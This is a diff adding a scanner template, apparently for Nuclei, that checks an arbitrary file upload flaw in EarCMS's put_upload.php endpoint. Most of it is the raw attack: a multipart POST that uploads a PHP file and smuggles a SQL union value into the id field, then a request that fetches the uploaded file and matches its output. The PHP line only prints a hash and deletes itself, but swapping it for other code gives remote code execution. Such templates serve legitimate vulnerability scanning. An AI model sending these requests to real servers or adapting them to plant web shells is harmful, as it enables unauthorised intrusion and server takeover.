@@ -1,0 +1,46 @@
+id: EarCMS-put_upload-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: EarCMS put_upload.php接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /source/index/put_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=---------------------------51564987891651984798165156489
+        Content-Length: 557
+
+        -----------------------------51564987891651984798165156489
+        Content-Disposition: form-data; name="ipa"; filename="dudesuite"
+        Content-Type: application/x-msdownload
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        -----------------------------51564987891651984798165156489
+        Content-Disposition: form-data; name="id"
+
+        -1  union SELECT "dudesuite.php";
+        -----------------------------51564987891651984798165156489
+        Content-Disposition: form-data; name="pw"
+
+        month-cf3b79c6e54ca7a8d50cdc8aedcde407
+        -----------------------------51564987891651984798165156489--
+      - |+
+        GET /data/attachment/dudesuite.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
